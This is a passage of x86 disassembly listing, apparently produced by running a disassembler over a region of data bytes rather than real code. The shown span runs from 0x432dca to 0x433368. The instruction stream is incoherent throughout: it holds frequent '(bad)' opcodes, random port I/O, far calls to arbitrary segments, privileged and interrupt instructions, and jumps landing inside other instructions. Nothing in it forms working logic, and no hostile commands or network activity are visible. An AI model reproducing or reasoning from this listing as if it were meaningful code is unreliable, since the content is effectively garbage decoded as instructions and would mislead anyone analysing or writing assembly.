  432dca:	d3 b6 a7 60 4d 0b    	shll   %cl,0xb4d60a7(%esi)
  432dd0:	b1 cc                	mov    $0xcc,%cl
  432dd2:	f8                   	clc
  432dd3:	5e                   	pop    %esi
  432dd4:	22 13                	and    (%ebx),%dl
  432dd6:	5a                   	pop    %edx
  432dd7:	33 32                	xor    (%edx),%esi
  432dd9:	56                   	push   %esi
  432dda:	b8 0c da e5 ad       	mov    $0xade5da0c,%eax
  432ddf:	ad                   	lods   %ds:(%esi),%eax
  432de0:	f0 83 dd ed          	lock sbb $0xffffffed,%ebp
  432de4:	e7 91                	out    %eax,$0x91
  432de6:	65 c3                	gs ret
  432de8:	b5 84                	mov    $0x84,%ch
  432dea:	01 3c 84             	add    %edi,(%esp,%eax,4)
  432ded:	32 30                	xor    (%eax),%dh
  432def:	c3                   	ret
  432df0:	d8 99 79 00 f2 86    	fcomps -0x790dff87(%ecx)
  432df6:	c3                   	ret
  432df7:	84 21                	test   %ah,(%ecx)
  432df9:	b5 f8                	mov    $0xf8,%ch
  432dfb:	7f ba                	jg     0x432db7
  432dfd:	f0 9a 8e b1 10 eb 90 	lock lcall $0xd990,$0xeb10b18e
  432e04:	d9 
  432e05:	f3 9e                	repz sahf
  432e07:	51                   	push   %ecx
  432e08:	b5 be                	mov    $0xbe,%ch
  432e0a:	11 01                	adc    %eax,(%ecx)
  432e0c:	18 c2                	sbb    %al,%dl
  432e0e:	4b                   	dec    %ebx
  432e0f:	4d                   	dec    %ebp
  432e10:	eb 50                	jmp    0x432e62
  432e12:	d9 00                	flds   (%eax)
  432e14:	47                   	inc    %edi
  432e15:	bb 67 49 49 c5       	mov    $0xc5494967,%ebx
  432e1a:	b2 d5                	mov    $0xd5,%dl
  432e1c:	b7 77                	mov    $0x77,%bh
  432e1e:	58                   	pop    %eax
  432e1f:	72 75                	jb     0x432e96
  432e21:	62 ad c7 51 b9 54    	bound  %ebp,0x54b951c7(%ebp)
  432e27:	94                   	xchg   %eax,%esp
  432e28:	d0 0a                	rorb   $1,(%edx)
  432e2a:	72 ff                	jb     0x432e2b
  432e2c:	4e                   	dec    %esi
  432e2d:	87 05 45 cf 9e 2f    	xchg   %eax,0x2f9ecf45
  432e33:	51                   	push   %ecx
  432e34:	eb 72                	jmp    0x432ea8
  432e36:	e6 47                	out    %al,$0x47
  432e38:	a0 d1 e6 79 5c       	mov    0x5c79e6d1,%al
  432e3d:	a2 cc df fe 5c       	mov    %al,0x5cfedfcc
  432e42:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  432e43:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  432e44:	de 9b 6f fe ab 01    	ficomps 0x1abfe6f(%ebx)
  432e4a:	ea 93 1a 52 07 89 1f 	ljmp   $0x1f89,$0x7521a93
  432e51:	32 37                	xor    (%edi),%dh
  432e53:	33 53 19             	xor    0x19(%ebx),%edx
  432e56:	58                   	pop    %eax
  432e57:	bb 92 10 fc eb       	mov    $0xebfc1092,%ebx
  432e5c:	53                   	push   %ebx
  432e5d:	ac                   	lods   %ds:(%esi),%al
  432e5e:	36 c6                	ss (bad)
  432e60:	d0 01                	rolb   $1,(%ecx)
  432e62:	35 6d 1d f9 cf       	xor    $0xcff91d6d,%eax
  432e67:	5e                   	pop    %esi
  432e68:	08 f5                	or     %dh,%ch
  432e6a:	04 48                	add    $0x48,%al
  432e6c:	5b                   	pop    %ebx
  432e6d:	d3 2a                	shrl   %cl,(%edx)
  432e6f:	47                   	inc    %edi
  432e70:	dd 40 35             	fldl   0x35(%eax)
  432e73:	30 f4                	xor    %dh,%ah
  432e75:	8b 1a                	mov    (%edx),%ebx
  432e77:	f6 6c 43 9c          	imulb  -0x64(%ebx,%eax,2)
  432e7b:	bb 77 f2 0e 21       	mov    $0x210ef277,%ebx
  432e80:	4d                   	dec    %ebp
  432e81:	f3 d1 9d 81 a1 0c f7 	repz rcrl $1,-0x8f35e7f(%ebp)
  432e88:	4f                   	dec    %edi
  432e89:	60                   	pusha
  432e8a:	8f                   	(bad)
  432e8b:	a3 ba 93 a3 87       	mov    %eax,0x87a393ba
  432e90:	f1                   	int1
  432e91:	58                   	pop    %eax
  432e92:	df 13                	fists  (%ebx)
  432e94:	54                   	push   %esp
  432e95:	46                   	inc    %esi
  432e96:	24 21                	and    $0x21,%al
  432e98:	b8 81 dc e1 0a       	mov    $0xae1dc81,%eax
  432e9d:	ca 2b ae             	lret   $0xae2b
  432ea0:	32 7a 93             	xor    -0x6d(%edx),%bh
  432ea3:	b6 50                	mov    $0x50,%dh
  432ea5:	d3 7e e9             	sarl   %cl,-0x17(%esi)
  432ea8:	fc                   	cld
  432ea9:	97                   	xchg   %eax,%edi
  432eaa:	a8 e6                	test   $0xe6,%al
  432eac:	75 d3                	jne    0x432e81
  432eae:	6d                   	insl   (%dx),%es:(%edi)
  432eaf:	ab                   	stos   %eax,%es:(%edi)
  432eb0:	83 dd 80             	sbb    $0xffffff80,%ebp
  432eb3:	89 0e                	mov    %ecx,(%esi)
  432eb5:	37                   	aaa
  432eb6:	1b 92 5e f4 92 59    	sbb    0x5992f45e(%edx),%edx
  432ebc:	f2 97                	repnz xchg %eax,%edi
  432ebe:	e5 8a                	in     $0x8a,%eax
  432ec0:	82 f4 e8             	xor    $0xe8,%ah
  432ec3:	28 12                	sub    %dl,(%edx)
  432ec5:	0c 1b                	or     $0x1b,%al
  432ec7:	ad                   	lods   %ds:(%esi),%eax
  432ec8:	1d 88 e0 fc c2       	sbb    $0xc2fce088,%eax
  432ecd:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  432ece:	ff 5d a5             	lcall  *-0x5b(%ebp)
  432ed1:	3e 8c 36             	mov    %?,%ds:(%esi)
  432ed4:	2b d3                	sub    %ebx,%edx
  432ed6:	82 91 f3 2e 87 de 00 	adcb   $0x0,-0x2178d10d(%ecx)
  432edd:	37                   	aaa
  432ede:	22 25 ca 68 4b a7    	and    0xa74b68ca,%ah
  432ee4:	8e 73 e7             	mov    -0x19(%ebx),%?
  432ee7:	7e 79                	jle    0x432f62
  432ee9:	19 16                	sbb    %edx,(%esi)
  432eeb:	94                   	xchg   %eax,%esp
  432eec:	d8 af f8 0c a8 9b    	fsubrs -0x6457f308(%edi)
  432ef2:	60                   	pusha
  432ef3:	21 8a 3e b8 e8 68    	and    %ecx,0x68e8b83e(%edx)
  432ef9:	d5 d7                	aad    $0xd7
  432efb:	72 38                	jb     0x432f35
  432efd:	bb 36 1a f0 33       	mov    $0x33f01a36,%ebx
  432f02:	71 a3                	jno    0x432ea7
  432f04:	9a 25 99 ac 0d 15 61 	lcall  $0x6115,$0xdac9925
  432f0b:	38 ad 9b dc d3 13    	cmp    %ch,0x13d3dc9b(%ebp)
  432f11:	2c 4a                	sub    $0x4a,%al
  432f13:	d5 40                	aad    $0x40
  432f15:	96                   	xchg   %eax,%esi
  432f16:	82 ba 64 a7 5e 41 e1 	cmpb   $0xe1,0x415ea764(%edx)
  432f1d:	35 b4 04 bb 83       	xor    $0x83bb04b4,%eax
  432f22:	19 08                	sbb    %ecx,(%eax)
  432f24:	89 42 0d             	mov    %eax,0xd(%edx)
  432f27:	3e b7 1e             	ds mov $0x1e,%bh
  432f2a:	38 12                	cmp    %dl,(%edx)
  432f2c:	f6 ab 9d 74 00 91    	imulb  -0x6eff8b63(%ebx)
  432f32:	7f 84                	jg     0x432eb8
  432f34:	6b 06 f5             	imul   $0xfffffff5,(%esi),%eax
  432f37:	82 3c d1 b3          	cmpb   $0xb3,(%ecx,%edx,8)
  432f3b:	82 46 cb f3          	addb   $0xf3,-0x35(%esi)
  432f3f:	10 e5                	adc    %ah,%ch
  432f41:	e5 6b                	in     $0x6b,%eax
  432f43:	10 ae f7 91 09 b8    	adc    %ch,-0x47f66e09(%esi)
  432f49:	c3                   	ret
  432f4a:	98                   	cwtl
  432f4b:	84 99 47 c0 86 00    	test   %bl,0x86c047(%ecx)
  432f51:	dd 5c 3e c8          	fstpl  -0x38(%esi,%edi,1)
  432f55:	fd                   	std
  432f56:	51                   	push   %ecx
  432f57:	17                   	pop    %ss
  432f58:	d0 6c e9 ad          	shrb   $1,-0x53(%ecx,%ebp,8)
  432f5c:	61                   	popa
  432f5d:	5b                   	pop    %ebx
  432f5e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  432f5f:	82 b7 75 10 af be b2 	xorb   $0xb2,-0x4150ef8b(%edi)
  432f66:	e3 c8                	jecxz  0x432f30
  432f68:	e6 38                	out    %al,$0x38
  432f6a:	03 fb                	add    %ebx,%edi
  432f6c:	bb 1a b3 81 5d       	mov    $0x5d81b31a,%ebx
  432f71:	3b 32                	cmp    (%edx),%esi
  432f73:	45                   	inc    %ebp
  432f74:	9d                   	popf
  432f75:	1a b0 56 c7 53 84    	sbb    -0x7bac38aa(%eax),%dh
  432f7b:	71 2e                	jno    0x432fab
  432f7d:	08 62 f6             	or     %ah,-0xa(%edx)
  432f80:	6e                   	outsb  %ds:(%esi),(%dx)
  432f81:	3c aa                	cmp    $0xaa,%al
  432f83:	04 c4                	add    $0xc4,%al
  432f85:	7f 90                	jg     0x432f17
  432f87:	e4 27                	in     $0x27,%al
  432f89:	6d                   	insl   (%dx),%es:(%edi)
  432f8a:	98                   	cwtl
  432f8b:	92                   	xchg   %eax,%edx
  432f8c:	b0 47                	mov    $0x47,%al
  432f8e:	6e                   	outsb  %ds:(%esi),(%dx)
  432f8f:	8b 50 7e             	mov    0x7e(%eax),%edx
  432f92:	42                   	inc    %edx
  432f93:	87 79 a1             	xchg   %edi,-0x5f(%ecx)
  432f96:	0a a5 96 6b e5 06    	or     0x6e56b96(%ebp),%ah
  432f9c:	e8 02 80 49 f8       	call   0xf88cafa3
  432fa1:	92                   	xchg   %eax,%edx
  432fa2:	77 61                	ja     0x433005
  432fa4:	65 12 27             	adc    %gs:(%edi),%ah
  432fa7:	07                   	pop    %es
  432fa8:	2f                   	das
  432fa9:	30 cc                	xor    %cl,%ah
  432fab:	5c                   	pop    %esp
  432fac:	d8 a1 f0 55 62 d2    	fsubs  -0x2d9daa10(%ecx)
  432fb2:	66 55                	push   %bp
  432fb4:	fa                   	cli
  432fb5:	34 e7                	xor    $0xe7,%al
  432fb7:	0a 42 6b             	or     0x6b(%edx),%al
  432fba:	ff b5 39 55 ed b8    	push   -0x4712aac7(%ebp)
  432fc0:	0d fe 60 00 e2       	or     $0xe20060fe,%eax
  432fc5:	7e cb                	jle    0x432f92
  432fc7:	d7                   	xlat   %ds:(%ebx)
  432fc8:	98                   	cwtl
  432fc9:	7e e7                	jle    0x432fb2
  432fcb:	10 73 9d             	adc    %dh,-0x63(%ebx)
  432fce:	8b a8 4e 71 21 dd    	mov    -0x22de8eb2(%eax),%ebp
  432fd4:	e3 9f                	jecxz  0x432f75
  432fd6:	6a 18                	push   $0x18
  432fd8:	ca a4 5a             	lret   $0x5aa4
  432fdb:	e6 57                	out    %al,$0x57
  432fdd:	ef                   	out    %eax,(%dx)
  432fde:	0e                   	push   %cs
  432fdf:	0f ff da             	ud0    %edx,%ebx
  432fe2:	4f                   	dec    %edi
  432fe3:	61                   	popa
  432fe4:	b1 3e                	mov    $0x3e,%cl
  432fe6:	a0 8e 34 49 6f       	mov    0x6f49348e,%al
  432feb:	4b                   	dec    %ebx
  432fec:	76 3c                	jbe    0x43302a
  432fee:	94                   	xchg   %eax,%esp
  432fef:	b3 e5                	mov    $0xe5,%bl
  432ff1:	63 08                	arpl   %ecx,(%eax)
  432ff3:	18 01                	sbb    %al,(%ecx)
  432ff5:	52                   	push   %edx
  432ff6:	6d                   	insl   (%dx),%es:(%edi)
  432ff7:	e0 55                	loopne 0x43304e
  432ff9:	bd e6 76 20 2f       	mov    $0x2f2076e6,%ebp
  432ffe:	e3 8e                	jecxz  0x432f8e
  433000:	10 06                	adc    %al,(%esi)
  433002:	7b b4                	jnp    0x432fb8
  433004:	0a 26                	or     (%esi),%ah
  433006:	f7 55 9c             	notl   -0x64(%ebp)
  433009:	87 45 80             	xchg   %eax,-0x80(%ebp)
  43300c:	53                   	push   %ebx
  43300d:	55                   	push   %ebp
  43300e:	46                   	inc    %esi
  43300f:	91                   	xchg   %eax,%ecx
  433010:	56                   	push   %esi
  433011:	d9 2c c4             	fldcw  (%esp,%eax,8)
  433014:	d2 81 0f 09 5a 6c    	rolb   %cl,0x6c5a090f(%ecx)
  43301a:	55                   	push   %ebp
  43301b:	c9                   	leave
  43301c:	bf 21 22 c5 e1       	mov    $0xe1c52221,%edi
  433021:	4b                   	dec    %ebx
  433022:	c9                   	leave
  433023:	e2 4e                	loop   0x433073
  433025:	7a ac                	jp     0x432fd3
  433027:	67 e9 fa 01 ef 24    	addr16 jmp 0x25323227
  43302d:	7b a4                	jnp    0x432fd3
  43302f:	24 29                	and    $0x29,%al
  433031:	50                   	push   %eax
  433032:	9f                   	lahf
  433033:	a8 5a                	test   $0x5a,%al
  433035:	14 0f                	adc    $0xf,%al
  433037:	42                   	inc    %edx
  433038:	40                   	inc    %eax
  433039:	36 49                	ss dec %ecx
  43303b:	57                   	push   %edi
  43303c:	ee                   	out    %al,(%dx)
  43303d:	36 5f                	ss pop %edi
  43303f:	72 69                	jb     0x4330aa
  433041:	7a 29                	jp     0x43306c
  433043:	85 18                	test   %ebx,(%eax)
  433045:	70 30                	jo     0x433077
  433047:	83 b5 25 bc 5a fc 00 	xorl   $0x0,-0x3a543db(%ebp)
  43304e:	9b                   	fwait
  43304f:	a8 79                	test   $0x79,%al
  433051:	a0 73 a0 bd 07       	mov    0x7bda073,%al
  433056:	8f                   	(bad)
  433057:	ac                   	lods   %ds:(%esi),%al
  433058:	d4 dd                	aam    $0xdd
  43305a:	17                   	pop    %ss
  43305b:	1c b1                	sbb    $0xb1,%al
  43305d:	60                   	pusha
  43305e:	d0 50 15             	rclb   $1,0x15(%eax)
  433061:	9e                   	sahf
  433062:	36 63 69 5e          	arpl   %ebp,%ss:0x5e(%ecx)
  433066:	f8                   	clc
  433067:	d6                   	salc
  433068:	e5 2f                	in     $0x2f,%eax
  43306a:	e0 a2                	loopne 0x43300e
  43306c:	f2 bb 3d 62 a0 f3    	repnz mov $0xf3a0623d,%ebx
  433072:	52                   	push   %edx
  433073:	aa                   	stos   %al,%es:(%edi)
  433074:	b6 21                	mov    $0x21,%dh
  433076:	33 fd                	xor    %ebp,%edi
  433078:	1a 0d 0c 29 4d f1    	sbb    0xf14d290c,%cl
  43307e:	6f                   	outsl  %ds:(%esi),(%dx)
  43307f:	7b f0                	jnp    0x433071
  433081:	d9 38                	fnstcw (%eax)
  433083:	fe 4e f3             	decb   -0xd(%esi)
  433086:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  433087:	2c ec                	sub    $0xec,%al
  433089:	f9                   	stc
  43308a:	b0 59                	mov    $0x59,%al
  43308c:	c0 2c 18 93          	shrb   $0x93,(%eax,%ebx,1)
  433090:	28 b0 34 4e db 80    	sub    %dh,-0x7f24b1cc(%eax)
  433096:	16                   	push   %ss
  433097:	47                   	inc    %edi
  433098:	91                   	xchg   %eax,%ecx
  433099:	20 c3                	and    %al,%bl
  43309b:	c8 60 4d 2c          	enter  $0x4d60,$0x2c
  43309f:	06                   	push   %es
  4330a0:	ab                   	stos   %eax,%es:(%edi)
  4330a1:	8d 43 f3             	lea    -0xd(%ebx),%eax
  4330a4:	bd 7e 11 02 f4       	mov    $0xf402117e,%ebp
  4330a9:	12 9a 17 7f 37 f7    	adc    -0x8c880e9(%edx),%bl
  4330af:	7c c7                	jl     0x433078
  4330b1:	b6 a8                	mov    $0xa8,%dh
  4330b3:	fd                   	std
  4330b4:	52                   	push   %edx
  4330b5:	9e                   	sahf
  4330b6:	13 8d 2a 75 3f 5b    	adc    0x5b3f752a(%ebp),%ecx
  4330bc:	4e                   	dec    %esi
  4330bd:	c6                   	(bad)
  4330be:	d8 0b                	fmuls  (%ebx)
  4330c0:	91                   	xchg   %eax,%ecx
  4330c1:	02 df                	add    %bh,%bl
  4330c3:	b2 c8                	mov    $0xc8,%dl
  4330c5:	42                   	inc    %edx
  4330c6:	7b ae                	jnp    0x433076
  4330c8:	f0 3c 34             	lock cmp $0x34,%al
  4330cb:	25 2d a9 cc bb       	and    $0xbbcca92d,%eax
  4330d0:	58                   	pop    %eax
  4330d1:	fc                   	cld
  4330d2:	33 51 73             	xor    0x73(%ecx),%edx
  4330d5:	bc c1 1c 91 7a       	mov    $0x7a911cc1,%esp
  4330da:	62 bd 83 92 66 87    	bound  %edi,-0x78996d7d(%ebp)
  4330e0:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4330e1:	c2 16 66             	ret    $0x6616
  4330e4:	83 0d 43 03 56 1d b4 	orl    $0xffffffb4,0x1d560343
  4330eb:	d0 7a fc             	sarb   $1,-0x4(%edx)
  4330ee:	b9 1f b4 b6 cf       	mov    $0xcfb6b41f,%ecx
  4330f3:	cc                   	int3
  4330f4:	0d a8 c7 fc e8       	or     $0xe8fcc7a8,%eax
  4330f9:	83 9f 8f c8 0a 54 bd 	sbbl   $0xffffffbd,0x540ac88f(%edi)
  433100:	06                   	push   %es
  433101:	2a 28                	sub    (%eax),%ch
  433103:	61                   	popa
  433104:	28 a1 ee ca f5 bd    	sub    %ah,-0x420a3512(%ecx)
  43310a:	06                   	push   %es
  43310b:	21 35 8f 86 1d 24    	and    %esi,0x241d868f
  433111:	3c 79                	cmp    $0x79,%al
  433113:	bf 19 7b e5 57       	mov    $0x57e57b19,%edi
  433118:	10 cb                	adc    %cl,%bl
  43311a:	d6                   	salc
  43311b:	55                   	push   %ebp
  43311c:	ae                   	scas   %es:(%edi),%al
  43311d:	86 c4                	xchg   %al,%ah
  43311f:	f9                   	stc
  433120:	b9 ec e1 6f 07       	mov    $0x76fe1ec,%ecx
  433125:	fb                   	sti
  433126:	7c d6                	jl     0x4330fe
  433128:	5c                   	pop    %esp
  433129:	6e                   	outsb  %ds:(%esi),(%dx)
  43312a:	99                   	cltd
  43312b:	c2 9b 97             	ret    $0x979b
  43312e:	fa                   	cli
  43312f:	eb 8a                	jmp    0x4330bb
  433131:	7c 5d                	jl     0x433190
  433133:	0a 33                	or     (%ebx),%dh
  433135:	3b 1b                	cmp    (%ebx),%ebx
  433137:	7a 37                	jp     0x433170
  433139:	d8 90 78 2d f6 90    	fcoms  -0x6f09d288(%eax)
  43313f:	c6                   	(bad)
  433140:	e3 a1                	jecxz  0x4330e3
  433142:	40                   	inc    %eax
  433143:	cd c4                	int    $0xc4
  433145:	93                   	xchg   %eax,%ebx
  433146:	5a                   	pop    %edx
  433147:	6b 27 22             	imul   $0x22,(%edi),%esp
  43314a:	83 e5 58             	and    $0x58,%ebp
  43314d:	a1 cf 29 51 7e       	mov    0x7e5129cf,%eax
  433152:	15 61 e3 c8 1e       	adc    $0x1ec8e361,%eax
  433157:	4a                   	dec    %edx
  433158:	c9                   	leave
  433159:	94                   	xchg   %eax,%esp
  43315a:	ba 50 9f 4f 0b       	mov    $0xb4f9f50,%edx
  43315f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  433160:	8d                   	lea    (bad),%esp
  433161:	e5 b4                	in     $0xb4,%eax
  433163:	57                   	push   %edi
  433164:	d0 b2 b9 52 62 84    	shlb   $1,-0x7b9dad47(%edx)
  43316a:	f3 90                	pause
  43316c:	6e                   	outsb  %ds:(%esi),(%dx)
  43316d:	09 83 62 3d aa 81    	or     %eax,-0x7e55c29e(%ebx)
  433173:	d7                   	xlat   %ds:(%ebx)
  433174:	e6 f3                	out    %al,$0xf3
  433176:	69 f4 97 32 f1 6b    	imul   $0x6bf13297,%esp,%esi
  43317c:	f8                   	clc
  43317d:	85 19                	test   %ebx,(%ecx)
  43317f:	5a                   	pop    %edx
  433180:	2d 03 9e fd ae       	sub    $0xaefd9e03,%eax
  433185:	7c d8                	jl     0x43315f
  433187:	44                   	inc    %esp
  433188:	71 e2                	jno    0x43316c
  43318a:	92                   	xchg   %eax,%edx
  43318b:	d3 76 44             	shll   %cl,0x44(%esi)
  43318e:	46                   	inc    %esi
  43318f:	28 3c 66             	sub    %bh,(%esi,%eiz,2)
  433192:	36 91                	ss xchg %eax,%ecx
  433194:	09 a2 8b af 47 be    	or     %esp,-0x41b85075(%edx)
  43319a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  43319b:	35 0b f4 9f a2       	xor    $0xa29ff40b,%eax
  4331a0:	8d bb f6 16 79 22    	lea    0x227916f6(%ebx),%edi
  4331a6:	cb                   	lret
  4331a7:	71 96                	jno    0x43313f
  4331a9:	e4 93                	in     $0x93,%al
  4331ab:	ca 17 17             	lret   $0x1717
  4331ae:	a3 af 58 11 3c       	mov    %eax,0x3c1158af
  4331b3:	f1                   	int1
  4331b4:	0b 6c be dc          	or     -0x24(%esi,%edi,4),%ebp
  4331b8:	30 1b                	xor    %bl,(%ebx)
  4331ba:	fe 87 8a 61 ee 81    	incb   -0x7e119e76(%edi)
  4331c0:	4d                   	dec    %ebp
  4331c1:	3e 5d                	ds pop %ebp
  4331c3:	c6                   	(bad)
  4331c4:	d1 1b                	rcrl   $1,(%ebx)
  4331c6:	42                   	inc    %edx
  4331c7:	d7                   	xlat   %ds:(%ebx)
  4331c8:	d7                   	xlat   %ds:(%ebx)
  4331c9:	25 b7 33 a8 6d       	and    $0x6da833b7,%eax
  4331ce:	37                   	aaa
  4331cf:	ee                   	out    %al,(%dx)
  4331d0:	0c 2e                	or     $0x2e,%al
  4331d2:	a8 d6                	test   $0xd6,%al
  4331d4:	ff f1                	push   %ecx
  4331d6:	f0 38 ee             	lock cmp %ch,%dh
  4331d9:	07                   	pop    %es
  4331da:	8d 49 06             	lea    0x6(%ecx),%ecx
  4331dd:	24 a3                	and    $0xa3,%al
  4331df:	65 48                	gs dec %eax
  4331e1:	fe c5                	inc    %ch
  4331e3:	48                   	dec    %eax
  4331e4:	f8                   	clc
  4331e5:	58                   	pop    %eax
  4331e6:	19 77 d3             	sbb    %esi,-0x2d(%edi)
  4331e9:	9b                   	fwait
  4331ea:	cb                   	lret
  4331eb:	d2 1e                	rcrb   %cl,(%esi)
  4331ed:	04 61                	add    $0x61,%al
  4331ef:	29 64 44 c9          	sub    %esp,-0x37(%esp,%eax,2)
  4331f3:	12 f4                	adc    %ah,%dh
  4331f5:	05 e3 f9 32 79       	add    $0x7932f9e3,%eax
  4331fa:	ec                   	in     (%dx),%al
  4331fb:	ef                   	out    %eax,(%dx)
  4331fc:	04 c4                	add    $0xc4,%al
  4331fe:	82 c9 75             	or     $0x75,%cl
  433201:	bf 97 ce 94 7b       	mov    $0x7b94ce97,%edi
  433206:	c6                   	(bad)
  433207:	6c                   	insb   (%dx),%es:(%edi)
  433208:	d1 cd                	ror    $1,%ebp
  43320a:	43                   	inc    %ebx
  43320b:	1b c2                	sbb    %edx,%eax
  43320d:	24 4b                	and    $0x4b,%al
  43320f:	15 16 f9 ad fe       	adc    $0xfeadf916,%eax
  433214:	9c                   	pushf
  433215:	4a                   	dec    %edx
  433216:	c2 89 6e             	ret    $0x6e89
  433219:	14 b7                	adc    $0xb7,%al
  43321b:	d8 43 4d             	fadds  0x4d(%ebx)
  43321e:	dc 02                	faddl  (%edx)
  433220:	53                   	push   %ebx
  433221:	20 a0 05 21 84 ed    	and    %ah,-0x127bdefb(%eax)
  433227:	5c                   	pop    %esp
  433228:	a1 51 c1 12 5d       	mov    0x5d12c151,%eax
  43322d:	d6                   	salc
  43322e:	b2 1c                	mov    $0x1c,%dl
  433230:	a0 86 a3 ca 09       	mov    0x9caa386,%al
  433235:	a9 c8 33 64 9a       	test   $0x9a6433c8,%eax
  43323a:	4f                   	dec    %edi
  43323b:	ca 62 c4             	lret   $0xc462
  43323e:	fc                   	cld
  43323f:	66 d4 15             	data16 aam $0x15
  433242:	93                   	xchg   %eax,%ebx
  433243:	4c                   	dec    %esp
  433244:	c1 c7 b2             	rol    $0xb2,%edi
  433247:	95                   	xchg   %eax,%ebp
  433248:	20 4c 69 12          	and    %cl,0x12(%ecx,%ebp,2)
  43324c:	d2 f0                	shl    %cl,%al
  43324e:	4a                   	dec    %edx
  43324f:	58                   	pop    %eax
  433250:	9d                   	popf
  433251:	89 d3                	mov    %edx,%ebx
  433253:	89 59 e4             	mov    %ebx,-0x1c(%ecx)
  433256:	1d 27 77 31 89       	sbb    $0x89317727,%eax
  43325b:	f0 a2 db 90 c9 bb    	lock mov %al,0xbbc990db
  433261:	9a 7b e6 24 99 05 d6 	lcall  $0xd605,$0x9924e67b
  433268:	1c 96                	sbb    $0x96,%al
  43326a:	7a c1                	jp     0x43322d
  43326c:	dd 67 85             	frstor -0x7b(%edi)
  43326f:	39 d0                	cmp    %edx,%eax
  433271:	ae                   	scas   %es:(%edi),%al
  433272:	0d 64 e8 46 30       	or     $0x3046e864,%eax
  433277:	7b 96                	jnp    0x43320f
  433279:	85 e1                	test   %esp,%ecx
  43327b:	3f                   	aas
  43327c:	3d 80 ae e7 4c       	cmp    $0x4ce7ae80,%eax
  433281:	68 90 84 7a b6       	push   $0xb67a8490
  433286:	b3 16                	mov    $0x16,%bl
  433288:	d5 df                	aad    $0xdf
  43328a:	3c 7e                	cmp    $0x7e,%al
  43328c:	fa                   	cli
  43328d:	3b a0 c9 7a 8e 06    	cmp    0x68e7ac9(%eax),%esp
  433293:	3b e5                	cmp    %ebp,%esp
  433295:	64 be 11 bf b3 99    	fs mov $0x99b3bf11,%esi
  43329b:	9b                   	fwait
  43329c:	3d 53 c3 40 90       	cmp    $0x9040c353,%eax
  4332a1:	0f 34                	sysenter
  4332a3:	10 e6                	adc    %ah,%dh
  4332a5:	04 5e                	add    $0x5e,%al
  4332a7:	d2 45 52             	rolb   %cl,0x52(%ebp)
  4332aa:	0f 3b                	(bad)
  4332ac:	46                   	inc    %esi
  4332ad:	cb                   	lret
  4332ae:	61                   	popa
  4332af:	f5                   	cmc
  4332b0:	18 ef                	sbb    %ch,%bh
  4332b2:	9f                   	lahf
  4332b3:	37                   	aaa
  4332b4:	ca d7 49             	lret   $0x49d7
  4332b7:	f5                   	cmc
  4332b8:	d5 50                	aad    $0x50
  4332ba:	85 06                	test   %eax,(%esi)
  4332bc:	44                   	inc    %esp
  4332bd:	f2 65 15 02 20 43 f8 	repnz gs adc $0xf8432002,%eax
  4332c4:	5c                   	pop    %esp
  4332c5:	ab                   	stos   %eax,%es:(%edi)
  4332c6:	18 c3                	sbb    %al,%bl
  4332c8:	bc cf 46 c8 8a       	mov    $0x8ac846cf,%esp
  4332cd:	cd 83                	int    $0x83
  4332cf:	62 3e                	bound  %edi,(%esi)
  4332d1:	a1 ca dc 43 29       	mov    0x2943dcca,%eax
  4332d6:	e9 d0 49 f9 82       	jmp    0x833c7cab
  4332db:	21 e1                	and    %esp,%ecx
  4332dd:	09 45 8c             	or     %eax,-0x74(%ebp)
  4332e0:	2f                   	das
  4332e1:	fb                   	sti
  4332e2:	1a 98 6f f7 a1 48    	sbb    0x48a1f76f(%eax),%bl
  4332e8:	75 dd                	jne    0x4332c7
  4332ea:	e5 98                	in     $0x98,%eax
  4332ec:	9e                   	sahf
  4332ed:	c2 67 2b             	ret    $0x2b67
  4332f0:	d8 7b 48             	fdivrs 0x48(%ebx)
  4332f3:	ec                   	in     (%dx),%al
  4332f4:	45                   	inc    %ebp
  4332f5:	1c 6f                	sbb    $0x6f,%al
  4332f7:	05 a4 42 76 06       	add    $0x67642a4,%eax
  4332fc:	a3 90 6a 93 b1       	mov    %eax,0xb1936a90
  433301:	97                   	xchg   %eax,%edi
  433302:	48                   	dec    %eax
  433303:	85 2b                	test   %ebp,(%ebx)
  433305:	70 83                	jo     0x43328a
  433307:	6a 7a                	push   $0x7a
  433309:	fd                   	std
  43330a:	db c6                	fcmovnb %st(6),%st
  43330c:	b6 8e                	mov    $0x8e,%dh
  43330e:	4e                   	dec    %esi
  43330f:	4c                   	dec    %esp
  433310:	d9 93 3b 01 28 68    	fsts   0x6828013b(%ebx)
  433316:	9a ad 36 87 80 8f 9e 	lcall  $0x9e8f,$0x808736ad
  43331d:	71 d0                	jno    0x4332ef
  43331f:	e9 45 81 b1 05       	jmp    0x5f4b469
  433324:	51                   	push   %ecx
  433325:	f8                   	clc
  433326:	aa                   	stos   %al,%es:(%edi)
  433327:	31 0e                	xor    %ecx,(%esi)
  433329:	1c 3d                	sbb    $0x3d,%al
  43332b:	90                   	nop
  43332c:	dc 49 ba             	fmull  -0x46(%ecx)
  43332f:	2f                   	das
  433330:	db 78 57             	fstpt  0x57(%eax)
  433333:	07                   	pop    %es
  433334:	3a c6                	cmp    %dh,%al
  433336:	72 8d                	jb     0x4332c5
  433338:	28 64 2d d3          	sub    %ah,-0x2d(%ebp,%ebp,1)
  43333c:	59                   	pop    %ecx
  43333d:	77 9b                	ja     0x4332da
  43333f:	f3 4e                	repz dec %esi
  433341:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  433342:	b5 bb                	mov    $0xbb,%ch
  433344:	57                   	push   %edi
  433345:	28 0b                	sub    %cl,(%ebx)
  433347:	e0 a1                	loopne 0x4332ea
  433349:	8f 48 7d 31          	(bad)
  43334d:	f3 65 2e 11 c5       	repz gs cs adc %eax,%ebp
  433352:	ee                   	out    %al,(%dx)
  433353:	b1 81                	mov    $0x81,%cl
  433355:	90                   	nop
  433356:	36 57                	ss push %edi
  433358:	0f 6d                	(bad)
  43335a:	48                   	dec    %eax
  43335b:	af                   	scas   %es:(%edi),%eax
  43335c:	2d 83 37 63 48       	sub    $0x48633783,%eax
  433361:	54                   	push   %esp
  433362:	4b                   	dec    %ebx
  433363:	ee                   	out    %al,(%dx)
  433364:	36 47                	ss inc %edi
  433366:	0f cb                	bswap  %ebx
  433368:	5a                   	pop    %edx
